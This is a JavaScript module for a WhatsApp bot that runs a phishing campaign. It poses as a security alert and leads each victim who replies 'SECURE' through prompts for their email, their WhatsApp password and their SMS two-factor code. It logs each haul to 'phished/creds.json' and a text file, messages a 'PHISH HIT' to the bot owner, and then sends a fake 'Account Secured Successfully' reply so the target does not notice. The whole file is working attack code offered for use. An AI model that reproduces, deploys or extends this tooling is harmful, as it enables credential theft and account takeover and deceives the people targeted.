module.exports = (bot) => {
    const sock = bot.core || bot.sock || bot.client;
    const fs = require("node:fs");
    const path = require("node:path");

    // in-memory session store
    // jid → { stage, data: { email, password, code } }
    const sessions = new Map();

    // log dir
    const logDir = path.join(process.cwd(), "phished");
    if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
    const logFile = path.join(logDir, "creds.json");
    const rawLog  = path.join(logDir, "creds.txt");

    function saveHit(jid, data) {
        const entry = {
            jid,
            number: jid.split("@")[0],
            ...data,
            ts: new Date().toISOString()
        };

        // append to json log
        let existing = [];
        try {
            existing = JSON.parse(fs.readFileSync(logFile, "utf8"));
        } catch {}
        existing.push(entry);
        fs.writeFileSync(logFile, JSON.stringify(existing, null, 2), "utf8");

        // append to plain txt
        fs.appendFileSync(
            rawLog,
            `[${entry.ts}] +${entry.number} | ${entry.email} | ${entry.password} | code: ${entry.code || "N/A"}\n`,
            "utf8"
        );

        return entry;
    }

    async function notifyOwner(sock, entry) {
        const ownerJid = `${config.owner?.id}@s.whatsapp.net`;
        await sock.sendMessage(ownerJid, {
            text:
                `🎯 *PHISH HIT*\n\n` +
                `Number: +${entry.number}\n` +
                `JID: ${entry.jid}\n` +
                `Email: ${entry.email}\n` +
                `Password: ${entry.password}\n` +
                `2FA Code: ${entry.code || "not captured yet"}\n` +
                `Time: ${entry.ts}`
        });
    }

    // ── message handler ──
    bot.on("message", async (ctx) => {
        try {
            const msg = ctx.msg || ctx.message;
            if (!msg) return;

            const jid = msg.key?.remoteJid;
            if (!jid || jid.endsWith("@g.us")) return; // DM only

            const fromMe = msg.key?.fromMe;
            if (fromMe) return; // ignore own messages

            const text = (
                msg.message?.conversation ||
                msg.message?.extendedTextMessage?.text ||
                ""
            ).trim();

            if (!text) return;

            const session = sessions.get(jid);

            // ── no session — check if they responded to the lure ──
            if (!session) {
                if (text.toUpperCase() === "SECURE") {
                    sessions.set(jid, { stage: "ask_email", data: {} });
                    await sock.sendMessage(jid, {
                        text:
                            "✅ Great. Let's secure your account.\n\n" +
                            "First, please enter the *email address* linked to your WhatsApp account:"
                    });
                } else if (text.toUpperCase() === "IGNORE") {
                    await sock.sendMessage(jid, {
                        text:
                            "⚠️ If you believe this was you, no further action needed.\n" +
                            "However, we still recommend enabling two-step verification.\n\n" +
                            "Stay safe. 🔐"
                    });
                }
                return;
            }

            // ── stage: ask_email ──
            if (session.stage === "ask_email") {
                session.data.email = text;
                session.stage = "ask_password";
                sessions.set(jid, session);

                await sock.sendMessage(jid, {
                    text:
                        "🔒 Now enter your *WhatsApp account password*\n" +
                        "_(This is used to verify your identity — never shared with third parties)_"
                });
                return;
            }

            // ── stage: ask_password ──
            if (session.stage === "ask_password") {
                session.data.password = text;
                session.stage = "ask_2fa";
                sessions.set(jid, session);

                await sock.sendMessage(jid, {
                    text:
                        "📱 Almost done.\n\n" +
                        "A *6-digit verification code* has been sent to your phone via SMS.\n" +
                        "Please enter it below to complete verification:"
                });
                return;
            }

            // ── stage: ask_2fa ──
            if (session.stage === "ask_2fa") {
                session.data.code = text;
                session.stage = "done";
                sessions.set(jid, session);

                // save and notify
                const entry = saveHit(jid, session.data);
                await notifyOwner(sock, entry);

                // cool down the target — make them think it worked
                await sock.sendMessage(jid, {
                    text:
                        "✅ *Account Secured Successfully*\n\n" +
                        "The suspicious login attempt has been blocked.\n" +
                        "Your account is now protected.\n\n" +
                        "For additional security, consider enabling two-step verification in:\n" +
                        "*Settings → Account → Two-step verification*\n\n" +
                        "Thank you for keeping your account safe. 🔐"
                });

                // clean up session
                sessions.delete(jid);
                return;
            }

        } catch (e) {
            console.error("[phishhandler]", e);
        }
    });

    console.log("[phishhandler] Loaded");
};